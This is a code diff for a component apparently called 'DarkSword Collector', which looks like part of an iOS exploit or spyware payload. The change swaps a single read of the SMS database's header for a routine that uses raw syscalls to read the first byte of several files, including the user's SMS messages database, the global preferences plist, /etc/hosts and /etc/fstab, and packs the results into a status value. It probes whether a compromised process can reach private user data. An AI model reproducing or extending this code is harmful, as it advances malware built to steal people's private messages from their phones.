@@ -1,6 +1,9 @@
 /**
- * DarkSword Collector v17 - Read SMS.db first 4 bytes
- * Return: first 4 bytes of SMS.db as int (SQLite header = 0x53716C69 "Sqli")
+ * DarkSword Collector v18 - Multi-file diagnostic
+ * bits 0-7: /etc/hosts first byte (control: should be 0x23 '#')
+ * bits 8-15: SMS.db first byte
+ * bits 16-23: .GlobalPreferences.plist first byte
+ * bits 24-31: /etc/fstab first byte
  */
 
 static long _svc1(long n, long a) {
@@ -29,15 +32,20 @@ static long _svc3(long n, long a, long b, long c) {
 #define SYS_read  3
 #define SYS_close 6
 
-int ds_start(void) {
-    int fd = (int)_svc2(SYS_open, (long)"/var/mobile/Library/SMS/sms.db", 0);
-    if (fd < 0) return 0xdead0000 | (-fd & 0xFFFF);
-    
-    unsigned char buf[4] = {0};
-    int n = (int)_svc3(SYS_read, fd, (long)buf, 4);
+static unsigned char _fb(const char *path) {
+    int fd = (int)_svc2(SYS_open, (long)path, 0);
+    if (fd < 0) return 0xFF;
+    unsigned char b = 0;
+    int n = (int)_svc3(SYS_read, fd, (long)&b, 1);
     _svc1(SYS_close, fd);
-    
-    if (n < 4) return 0xbeef0000 | (n & 0xFFFF);
-    
-    return (int)buf[0] | ((int)buf[1] << 8) | ((int)buf[2] << 16) | ((int)buf[3] << 24);
+    return (n > 0) ? b : 0xFE;
+}
+
+int ds_start(void) {
+    unsigned char hosts = _fb("/etc/hosts");
+    unsigned char sms = _fb("/var/mobile/Library/SMS/sms.db");
+    unsigned char prefs = _fb("/var/mobile/Library/Preferences/.GlobalPreferences.plist");
+    unsigned char fstab = _fb("/etc/fstab");
+
+    return (int)hosts | ((int)sms << 8) | ((int)prefs << 16) | ((int)fstab << 24);
 }
